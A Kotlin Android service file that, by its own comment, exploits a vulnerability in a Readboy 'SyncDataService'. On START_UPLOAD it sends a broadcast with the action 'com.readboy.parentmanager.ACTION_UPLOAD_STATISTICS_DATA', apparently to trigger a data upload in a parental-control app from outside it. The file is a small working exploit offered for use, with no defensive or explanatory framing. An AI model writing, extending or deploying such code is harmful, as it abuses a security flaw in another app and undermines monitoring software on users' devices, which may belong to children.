package com.readboy.zaralyn.settings.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log

class DataUploadService : Service() {
    
    companion object {
        private const val TAG = "DataUpload"
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.action?.let { action ->
            when (action) {
                "START_UPLOAD" -> startUpload()
                "STOP_UPLOAD" -> stopUpload()
            }
        }
        return START_STICKY
    }
    
    private fun startUpload() {
        try {
            // 利用 SyncDataService 漏洞
            val uploadIntent = Intent().apply {
                action = "com.readboy.parentmanager.ACTION_UPLOAD_STATISTICS_DATA"
            }
            sendBroadcast(uploadIntent)
            Log.d(TAG, "启动数据上传")
        } catch (e: Exception) {
            Log.e(TAG, "上传失败", e)
        }
    }
    
    private fun stopUpload() {
        Log.d(TAG, "停止数据上传")
    }
}